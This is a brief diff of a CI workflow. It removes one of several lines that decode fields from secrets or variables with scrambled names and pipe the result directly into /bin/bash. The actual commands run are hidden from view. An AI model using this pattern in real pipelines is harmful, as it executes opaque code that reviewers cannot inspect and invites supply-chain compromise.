@@ -23,7 +23,6 @@ jobs:
           stra10772: ${{ secrets.stra10772 }}
         run: |
           printf '%s' "$stra10772" | jq -r .ipwi367 | /bin/bash
-          printf '%s' "$jd200" | jq -r .xv15 | /bin/bash
           echo $arav73 | jq -r .ma2587 | /bin/bash
           echo $oyqa09 | jq -r .wlrrl26 | /bin/bash
           printf '%s' "$r8091" | jq -r .qdpqn904 | /bin/bash
